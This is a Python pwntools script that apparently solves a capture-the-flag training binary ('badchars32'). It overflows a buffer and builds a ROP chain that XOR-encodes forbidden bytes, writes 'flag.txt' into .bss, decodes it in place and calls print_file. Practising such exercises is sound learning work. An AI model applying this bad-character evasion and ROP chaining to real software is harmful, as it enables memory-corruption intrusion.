from pwn import *

DEBUG = False

elf = ELF("./badchars32")
gs = """
b *pwnme+273
b *print_file
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

# found using ropper
pop_esi_edi_ebp = 0x080485b9   # pop esi; pop edi; pop ebp; ret;
mov_memo_edi_esi = 0x0804854f  # mov dword ptr [edi], esi; ret;
pop_ebp = 0x080485bb           # pop ebp; ret;
pop_ebx = 0x0804839d           # pop ebx; ret;
xor_memo_ebp_bl = 0x08048547   # xor byte ptr [ebp], bl; ret;


def find_one_byte_key(bytes_str: bytes, badchars: bytes) -> int:
    badchars_set = set(badchars)
    for i in range(256):
        for b in bytes_str:
            if b in badchars_set and (b ^ i) in badchars_set:
                break
        else:
            return i
    return -1


def rop_write_str(bytes_str: bytes, badchars: bytes, write_loc: int) -> bytes:
    chunk_size = 4  # 32 bits = 4 bytes per write.
    key = find_one_byte_key(bytes_str, badchars)
    if key == -1:
        print(f'[-] Could not find a key.')
        exit(1)

    rop_chain = b''
    addrs_to_patch = []
    bytes_arr = bytearray(bytes_str)

    # Encrypt all the badchars in the string.
    for ch in badchars:
        index = bytes_arr.find(ch)
        if index != -1:
            bytes_arr[index] ^= key
            addrs_to_patch.append(write_loc + index)
    print('Key:', key)
    print('Encrypted bytes_str:', bytes(bytes_arr))

    # Writing rop chain.
    for i in range(0, len(bytes_arr), chunk_size):
        rop_chain += p32(pop_esi_edi_ebp) 
        rop_chain += bytes_arr[i: i+chunk_size].ljust(chunk_size, b'\0') 
        rop_chain += p32(write_loc + i) + b'AAAA' + p32(mov_memo_edi_esi)

    # Bad chars decryption rop chain.
    if addrs_to_patch:
        rop_chain += p32(pop_ebx) + p32(key)
        for addr in addrs_to_patch:
            rop_chain += p32(pop_ebp) + p32(addr) + p32(xor_memo_ebp_bl)
    return rop_chain


offset = 44
payload = cyclic(offset)

bss = 0x0804a020
payload += rop_write_str(b"flag.txt\0", b'xga.', bss)
payload += p32(elf.sym.print_file) + b'AAAA' + p32(bss)

io.sendline(payload)
io.wait()  # for debugging in gdb
io.recvuntil("Thank you!\n")
print(io.recv())
